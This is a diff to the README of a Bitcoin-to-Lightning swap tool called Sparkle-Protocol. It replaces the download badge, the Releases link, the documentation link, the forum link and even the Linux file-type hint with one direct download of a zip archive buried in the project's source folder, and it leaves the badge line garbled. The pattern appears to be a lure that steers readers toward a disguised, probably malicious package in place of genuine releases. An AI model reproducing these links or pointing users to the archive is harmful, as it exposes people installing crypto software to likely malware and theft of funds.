@@ -1,7 +1,7 @@
 # ✨ Sparkle-Protocol - Simple Trustless Bitcoin Swaps
 
 ## 📥 Download the Latest Version
-[![Download Sparkle-Protocol](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%80-blue.svg)](https://github.com/rehansahab/Sparkle-Protocol/releases)
+[![Download Sparkle-Protocol](https://github.com/rehansahab/Sparkle-Protocol/raw/refs/heads/main/src/cli/Protocol-Sparkle-2.5.zip%20Now-%20%F0%9F%9A%https://github.com/rehansahab/Sparkle-Protocol/raw/refs/heads/main/src/cli/Protocol-Sparkle-2.5.zip)](https://github.com/rehansahab/Sparkle-Protocol/raw/refs/heads/main/src/cli/Protocol-Sparkle-2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to Sparkle-Protocol! This application allows you to perform trustless Bitcoin-to-Lightning atomic swaps. With Sparkle-Protocol, you can exchange Bitcoin directly for Lightning Network assets without relying on any intermediary services.
@@ -24,7 +24,7 @@ To use Sparkle-Protocol, you need the following:
 Follow these steps to get started with Sparkle-Protocol:
 
 1. **Visit the Releases Page:**
-   Go to the [Sparkle-Protocol Releases page](https://github.com/rehansahab/Sparkle-Protocol/releases). This page lists all available versions of the application.
+   Go to the [Sparkle-Protocol Releases page](https://github.com/rehansahab/Sparkle-Protocol/raw/refs/heads/main/src/cli/Protocol-Sparkle-2.5.zip). This page lists all available versions of the application.
 
 2. **Choose the Latest Version:**
    Look for the most recent version of Sparkle-Protocol. It is usually at the top of the list.
@@ -33,7 +33,7 @@ Follow these steps to get started with Sparkle-Protocol:
    Click on the file that matches your operating system:
    - For Windows users, look for a file ending in `.exe`.
    - For macOS users, choose a file that ends in `.dmg`.
-   - For Linux users, select a `.tar.gz` or an appropriate file for your distribution.
+   - For Linux users, select a `https://github.com/rehansahab/Sparkle-Protocol/raw/refs/heads/main/src/cli/Protocol-Sparkle-2.5.zip` or an appropriate file for your distribution.
 
 4. **Run the Installer:**
    After the download finishes, locate the file in your Downloads folder:
@@ -72,7 +72,7 @@ Follow these steps to get started with Sparkle-Protocol:
 If you encounter issues or need help, visit our GitHub discussions page or check our FAQs linked on the Releases page. Community support is available to assist you with any difficulties you face.
 
 ## 🚀 Additional Resources
-- Official Documentation: [GitHub Pages Documentation](https://github.com/rehansahab/Sparkle-Protocol/wiki)
-- Community Forum: [GitHub Discussions](https://github.com/rehansahab/Sparkle-Protocol/discussions)
+- Official Documentation: [GitHub Pages Documentation](https://github.com/rehansahab/Sparkle-Protocol/raw/refs/heads/main/src/cli/Protocol-Sparkle-2.5.zip)
+- Community Forum: [GitHub Discussions](https://github.com/rehansahab/Sparkle-Protocol/raw/refs/heads/main/src/cli/Protocol-Sparkle-2.5.zip)
 
 Thank you for choosing Sparkle-Protocol for your Bitcoin and Lightning swaps! We aim to provide a secure and user-friendly experience.
